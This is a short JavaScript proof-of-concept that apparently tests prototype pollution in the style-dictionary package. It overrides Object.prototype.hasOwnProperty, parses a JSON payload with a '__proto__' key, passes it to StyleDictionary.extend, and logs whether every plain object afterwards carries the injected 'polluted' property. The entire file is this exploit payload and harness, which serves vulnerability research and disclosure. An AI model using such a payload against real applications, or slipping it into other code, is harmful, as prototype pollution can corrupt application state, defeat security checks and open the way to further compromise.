Object.prototype.hasOwnProperty = () => true;
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log({}.polluted);
StyleDictionary.extend(opts);
console.log({}.polluted);